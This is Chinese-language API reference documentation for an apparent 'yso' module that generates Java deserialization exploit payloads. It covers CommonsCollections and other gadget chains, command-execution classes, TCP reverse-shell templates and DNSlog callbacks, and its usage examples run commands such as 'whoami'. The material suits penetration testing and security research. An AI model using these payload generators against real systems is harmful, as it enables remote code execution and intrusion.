# yso

|函数名|函数描述/介绍|
|:------|:--------|
| [yso.GenerateClass](#generateclass) |GenerateClass 根据提供的配置选项生成一个Java类对象。  这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。  对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板...|
| [yso.GenerateClassObjectFromBytes](#generateclassobjectfrombytes) |GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。  LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。  参数是...|
| [yso.GenerateDNSlogEvilClassObject](#generatednslogevilclassobject) |GenDnslogClassObject  GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，  并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dn...|
| [yso.GenerateHeaderEchoClassObject](#generateheaderechoclassobject) |GenHeaderEchoClassObject  GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，  options：一组可选的GenClassOptionFun函数，用于进一步定制生成...|
| [yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject](#generatemodifytomcatmaxheadersizeevilclassobject) |GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useModifyTomcatMaxHeaderS...|
| [yso.GenerateMultiEchoClassObject](#generatemultiechoclassobject) |GenMultiEchoClassObject  GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，  options：一组可选的Ge...|
| [yso.GenerateProcessBuilderExecEvilClassObject](#generateprocessbuilderexecevilclassobject) |GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，  并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExec...|
| [yso.GenerateProcessImplExecEvilClassObject](#generateprocessimplexecevilclassobject) |GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，  并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和...|
| [yso.GenerateRuntimeExecEvilClassObject](#generateruntimeexecevilclassobject) |GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，  并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecComma...|
| [yso.GenerateSleepClassObject](#generatesleepclassobject) |GenSleepClassObject  GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象  options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。  返回：成功时...|
| [yso.GenerateSpringEchoEvilClassObject](#generatespringechoevilclassobject) |GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内...|
| [yso.GenerateTcpReverseEvilClassObject](#generatetcpreverseevilclassobject) |GenTcpReverseClassObject  GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useTcpReverseTemplate ，tcpRev...|
| [yso.GenerateTcpReverseShellEvilClassObject](#generatetcpreverseshellevilclassobject) |GenTcpReverseShellClassObject  GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，  这个函数结合使用 useTcpReverseS...|
| [yso.GenerateTomcatEchoClassObject](#generatetomcatechoclassobject) |GenTomcatEchoClassObject  GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，  options：一组可选的GenClassOptionFun函数，用于进一步...|
| [yso.GetAllGadget](#getallgadget) |GetAllGadget 获取所有支持的Java反序列化Gadget。  这个函数会遍历所有已配置的Gadget，并为每个Gadget创建对应的生成函数。  对于支持模板实现的Gadget，会创建一个接受GenClassOptionFun参数的函数；  对于不支持模板实现的Gadget，会创建一个接...|
| [yso.GetAllRuntimeExecGadget](#getallruntimeexecgadget) |GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget，可用于爆破 gadget  |
| [yso.GetAllTemplatesGadget](#getalltemplatesgadget) |GetAllTemplatesGadget 获取所有支持模板的Gadget，可用于爆破 gadget  |
| [yso.GetBeanShell1JavaObject](#getbeanshell1javaobject) |GetBeanShell1JavaObject 基于BeanShell1 序列化模板生成并返回一个Java对象。  它首先解析预定义的BeanShell1序列化模板，然后在解析出的第一个Java对象中替换预设的占位符为传入的命令字符串。  cmd：要传入Java对象的命令字符串。  返回：成功时返回...|
| [yso.GetClick1JavaObject](#getclick1javaobject) |GetClick1JavaObject 基于Click1 序列化模板生成并返回一个Java对象。  用户可以通过可变参数`options`提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数允许用户定制生成的Java对象的特定属性或行为。  options：用于...|
| [yso.GetCommonsBeanutils183NOCCJavaObject](#getcommonsbeanutils183noccjavaobject) |GetCommonsBeanutils183NOCCJavaObject 基于Commons Beanutils 1.8.3 序列化模板生成并返回一个Java对象。  去除了对 commons-collections:3.1 的依赖。  通过可变参数`options`，用户可以提供额外的配置，这些配...|
| [yso.GetCommonsBeanutils192NOCCJavaObject](#getcommonsbeanutils192noccjavaobject) |GetCommonsBeanutils192NOCCJavaObject 基于Commons Beanutils 1.9.2 序列化模板生成并返回一个Java对象。  去除了对 commons-collections:3.1 的依赖。  通过可变参数`options`，用户可以提供额外的配置，这些配...|
| [yso.GetCommonsBeanutils1JavaObject](#getcommonsbeanutils1javaobject) |GetCommonsBeanutils1JavaObject 基于Commons Beanutils 1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的J...|
| [yso.GetCommonsCollections1JavaObject](#getcommonscollections1javaobject) |GetCommonsCollections1JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
| [yso.GetCommonsCollections2JavaObject](#getcommonscollections2javaobject) |GetCommonsCollections2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够...|
| [yso.GetCommonsCollections3JavaObject](#getcommonscollections3javaobject) |GetCommonsCollections3JavaObject 基于Commons Collections 3.1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够...|
| [yso.GetCommonsCollections4JavaObject](#getcommonscollections4javaobject) |GetCommonsCollections4JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够...|
| [yso.GetCommonsCollections5JavaObject](#getcommonscollections5javaobject) |GetCommonsCollections5JavaObject 基于Commons Collections 2 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生...|
| [yso.GetCommonsCollections6JavaObject](#getcommonscollections6javaobject) |GetCommonsCollections6JavaObject 基于Commons Collections 6 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生...|
| [yso.GetCommonsCollections7JavaObject](#getcommonscollections7javaobject) |GetCommonsCollections7JavaObject 基于Commons Collections 7 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生...|
| [yso.GetCommonsCollections8JavaObject](#getcommonscollections8javaobject) |GetCommonsCollections8JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够...|
| [yso.GetCommonsCollectionsK1JavaObject](#getcommonscollectionsk1javaobject) |GetCommonsCollectionsK1JavaObject 基于Commons Collections &amp;lt;=3.2.1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这...|
| [yso.GetCommonsCollectionsK2JavaObject](#getcommonscollectionsk2javaobject) |GetCommonsCollectionsK2JavaObject 基于Commons Collections 4.0 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能...|
| [yso.GetCommonsCollectionsK3JavaObject](#getcommonscollectionsk3javaobject) |GetCommonsCollectionsK3JavaObject 基于Commons Collections K3 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
| [yso.GetCommonsCollectionsK4JavaObject](#getcommonscollectionsk4javaobject) |GetCommonsCollectionsK4JavaObject 基于Commons Collections K4 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返...|
| [yso.GetFindGadgetByDNSJavaObject](#getfindgadgetbydnsjavaobject) |GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。  使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。  url：要在生成的Java对象中设置的URL字...|
| [yso.GetGadget](#getgadget) |GenerateGadget this is a highly flexible function that can generate a Java object by three different ways:   1. Generate a Java object that have no an...|
| [yso.GetGadgetNameByFun](#getgadgetnamebyfun) |GetGadgetNameByFun 从函数指针获取 gadget 名称，通过解析函数名来提取。  函数名需要符合 &amp;#34;Get*JavaObject&amp;#34; 格式，返回中间的 * 部分作为 gadget 名称  |
| [yso.GetGroovy1JavaObject](#getgroovy1javaobject) |GetGroovy1JavaObject 基于Groovy1 序列化模板生成并返回一个Java对象。  这个函数接受一个命令字符串作为参数，并将该命令设置在生成的Java对象中。  cmd：要设置在Java对象中的命令字符串。  返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应...|
| [yso.GetJBossInterceptors1JavaObject](#getjbossinterceptors1javaobject) |GetJBossInterceptors1JavaObject 基于JBossInterceptors1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的J...|
| [yso.GetJSON1JavaObject](#getjson1javaobject) |GetJSON1JavaObject 基于JSON1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的Java对象的特定属性或行为。  options：用于...|
| [yso.GetJavaObjectFromBytes](#getjavaobjectfrombytes) |GetJavaObjectFromBytes 从字节数组中解析并返回第一个Java对象。  此函数使用ParseJavaSerialized方法来解析提供的字节序列，  并期望至少能够解析出一个有效的Java对象。如果解析失败或者结果为空，  函数将返回错误。如果解析成功，它将返回解析出的第一个Ja...|
| [yso.GetJavassistWeld1JavaObject](#getjavassistweld1javaobject) |GetJavassistWeld1JavaObject 基于JavassistWeld1 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的Java对象的特定...|
| [yso.GetJdk7u21JavaObject](#getjdk7u21javaobject) |GetJdk7u21JavaObject 基于Jdk7u21 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的Java对象的特定属性或行为。  option...|
| [yso.GetJdk8u20JavaObject](#getjdk8u20javaobject) |GetJdk8u20JavaObject 基于Jdk8u20 序列化模板生成并返回一个Java对象。  通过可变参数`options`，用户可以提供额外的配置，这些配置使用GenClassOptionFun类型的函数指定。  这些函数使用户能够定制生成的Java对象的特定属性或行为。  option...|
| [yso.GetSimplePrincipalCollectionJavaObject](#getsimpleprincipalcollectionjavaobject) |GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。  主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。  使用一个空的 SimplePrinci...|
| [yso.GetURLDNSJavaObject](#geturldnsjavaobject) |GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。  这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。  url：要在生成的Java对象中设置的UR...|
| [yso.LoadClassFromBCEL](#loadclassfrombcel) |LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，  并从这些字节中加载并返回一个javaclassparser.ClassObject对象。  这个函数首先使用javaclassparser.Bcel2b...|
| [yso.LoadClassFromBase64](#loadclassfrombase64) |LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。  这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。  这些参数是Ge...|
| [yso.LoadClassFromBytes](#loadclassfrombytes) |LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。  这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。  这些参数是GenClassOpt...|
| [yso.ToBcel](#tobcel) |ToBcel 将 Java 类对象转换为 BCEL 编码格式的字符串  |
| [yso.ToBytes](#tobytes) |ToBytes 将 Java 或反序列化对象转换为字节码  |
| [yso.ToJson](#tojson) |ToJson 将 Java 或反序列化对象转换为 json 字符串  |
| [yso.command](#command) |SetExecCommand  command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。  |
| [yso.dirtyDataLength](#dirtydatalength) |SetToBytesDirtyDataLength 设置序列化数据中脏数据的长度  length: 要设置的脏数据长度  |
| [yso.dnslogDomain](#dnslogdomain) |SetDnslog  dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。  addr：要设置的 Dnslog 域名。  |
| [yso.dump](#dump) |dump 将Java 对象转换为类 Java 代码  |
| [yso.evilClassName](#evilclassname) |SetClassName  evilClassName 请求参数选项函数，用于设置生成的类名。  className：要设置的类名。  |
| [yso.majorVersion](#majorversion) ||
| [yso.obfuscationClassConstantPool](#obfuscationclassconstantpool) ||
| [yso.springEchoBody](#springechobody) ||
| [yso.springHeader](#springheader) |SetHeader  springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。  需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1....|
| [yso.springParam](#springparam) |SetParam  springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。  param：要设置的请求参数。  |
| [yso.springRuntimeExecAction](#springruntimeexecaction) ||
| [yso.tcpReverseHost](#tcpreversehost) |SetTcpReverseHost  tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。  还需要配合 tcpReverseToken 使用，用于是否反连成功的标...|
| [yso.tcpReversePort](#tcpreverseport) |SetTcpReversePort  tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。  还需要配合 tcpReverseToken 使用，用于是否反连成功的标...|
| [yso.tcpReverseToken](#tcpreversetoken) |SetTcpReverseToken  tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。  token：要设置的 token ...|
| [yso.threeBytesCharString](#threebytescharstring) ||
| [yso.twoBytesCharString](#twobytescharstring) ||
| [yso.useBase64BytesClass](#usebase64bytesclass) |SetClassBase64Bytes  useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。  base64：base64编码的字节码。  |
| [yso.useBytesClass](#usebytesclass) |SetClassBytes  useBytesClass 请求参数选项函数，传入字节码。  data：字节码。  |
| [yso.useBytesEvilClass](#usebytesevilclass) |SetBytesEvilClass  useBytesEvilClass 请求参数选项函数，传入自定义的字节码。  data：自定义的字节码。  |
| [yso.useClassMultiEchoTemplate](#useclassmultiechotemplate) ||
| [yso.useClassParam](#useclassparam) |SetClassParam 设置类生成时的参数  k: 参数名  v: 参数值  |
| [yso.useConstructorExecutor](#useconstructorexecutor) ||
| [yso.useDNSLogEvilClass](#usednslogevilclass) |SetDnslogEvilClass  useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。  addr：要设置的 Dnslog 域名。  |
| [yso.useDNSlogTemplate](#usednslogtemplate) ||
| [yso.useEchoBody](#useechobody) ||
| [yso.useHeaderEchoEvilClass](#useheaderechoevilclass) ||
| [yso.useHeaderEchoTemplate](#useheaderechotemplate) ||
| [yso.useHeaderParam](#useheaderparam) |SetHeader  springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。  需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1....|
| [yso.useModifyTomcatMaxHeaderSizeTemplate](#usemodifytomcatmaxheadersizetemplate) ||
| [yso.useMultiEchoEvilClass](#usemultiechoevilclass) ||
| [yso.useParam](#useparam) |SetParam  springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。  param：要设置的请求参数。  |
| [yso.useProcessBuilderExecEvilClass](#useprocessbuilderexecevilclass) |SetProcessBuilderExecEvilClass  useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。  cmd：要执行的命令字符串。  |
| [yso.useProcessBuilderExecTemplate](#useprocessbuilderexectemplate) ||
| [yso.useProcessImplExecEvilClass](#useprocessimplexecevilclass) |SetProcessImplExecEvilClass  useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。  cmd：要执行的命令字符串。  |
| [yso.useProcessImplExecTemplate](#useprocessimplexectemplate) ||
| [yso.useRuntimeExecEvilClass](#useruntimeexecevilclass) |SetRuntimeExecEvilClass  useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。  cmd：要执行的命令字符串。  |
| [yso.useRuntimeExecTemplate](#useruntimeexectemplate) ||
| [yso.useSleepEvilClass](#usesleepevilclass) ||
| [yso.useSleepTemplate](#usesleeptemplate) ||
| [yso.useSleepTime](#usesleeptime) |SetSleepTime  useSleepTime 请求参数选项函数，设置指定的 sleep 时长，需要配合 useSleepTemplate 使用，主要用与指定 sleep 时长，用于延时检测gadget。  |
| [yso.useSpringEchoTemplate](#usespringechotemplate) ||
| [yso.useTcpReverseEvilClass](#usetcpreverseevilclass) |SetTcpReverseEvilClass  useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。  相当于 useTcpReverseTemplate ，tcpReve...|
| [yso.useTcpReverseShellEvilClass](#usetcpreverseshellevilclass) |SetTcpReverseShellEvilClass  useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。  相当于 useTc...|
| [yso.useTcpReverseShellTemplate](#usetcpreverseshelltemplate) ||
| [yso.useTcpReverseTemplate](#usetcpreversetemplate) ||
| [yso.useTemplate](#usetemplate) |SetClassType 设置要生成的类类型  t: 类类型  |
| [yso.useTomcatEchoEvilClass](#usetomcatechoevilclass) ||
| [yso.useTomcatEchoTemplate](#usetomcatechotemplate) ||


## 函数定义
### GenerateClass

#### 详细描述
GenerateClass 根据提供的配置选项生成一个Java类对象。

这个函数是生成各种类型Java类对象的核心函数，它可以处理原始字节码类型和预定义的类模板。

对于原始字节码类型(ClassRaw)，它直接解析提供的模板；对于其他类型，它从YsoConfigInstance中加载相应的类模板并应用参数。

options：一组GenClassOptionFun函数，用于配置生成的类对象的各种属性。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
// 使用原始字节码生成类对象
classObj, err := yso.GenerateClass(yso.SetClassBytes(bytecode))

// 使用预定义模板生成类对象
classObj, err := yso.GenerateClass(yso.SetClassType(ClassRuntimeExec), yso.SetExecCommand("whoami"))
```


#### 定义

`GenerateClass(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateClassObjectFromBytes

#### 详细描述
GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。

LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。

参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

bytes：要从中加载类对象的字节数组。

options：用于配置类对象的可变参数函数列表。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
```


#### 定义

`GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| bytes | `[]byte` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateDNSlogEvilClassObject

#### 详细描述
GenDnslogClassObject

GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，

并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，

以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。

domain：要在生成的Java对象中请求的 Dnslog 域名。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
domain := "dnslog.com" // 假设的 Dnslog 域名
classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
```


#### 定义

`GenerateDNSlogEvilClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| domain | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateHeaderEchoClassObject

#### 详细描述
GenHeaderEchoClassObject

GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```


#### 定义

`GenerateHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateModifyTomcatMaxHeaderSizeEvilClassObject

#### 详细描述
GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，

这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
```


#### 定义

`GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateMultiEchoClassObject

#### 详细描述
GenMultiEchoClassObject

GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
body 回显
bodyClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
header 回显
headerClassObj,_ = yso.GenerateMultiEchoEvilClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
```


#### 定义

`GenerateMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateProcessBuilderExecEvilClassObject

#### 详细描述
GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

cmd：要在生成的Java对象中执行的命令字符串。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
```


#### 定义

`GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateProcessImplExecEvilClassObject

#### 详细描述
GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

cmd：要在生成的Java对象中执行的命令字符串。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
```


#### 定义

`GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateRuntimeExecEvilClassObject

#### 详细描述
GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，

并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，

以生成在反序列化时会执行特定命令的Java对象。

cmd：要在生成的Java对象中执行的命令字符串。

options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。

返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。

Example:
```
command := "ls" // 假设的命令字符串
classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
```


#### 定义

`GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)`

#### 参数
|参数名|参数类型|参数解释|
|:-----------|:---------- |:-----------|
| cmd | `string` |   |
| options | `...GenClassOptionFun` |   |

#### 返回值
|返回值(顺序)|返回值类型|返回值解释|
|:-----------|:---------- |:-----------|
| r1 | `*javaclassparser.ClassObject` |   |
| r2 | `error` |   |


### GenerateSleepClassObject

#### 详细描述
GenSleepClassObject

GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象

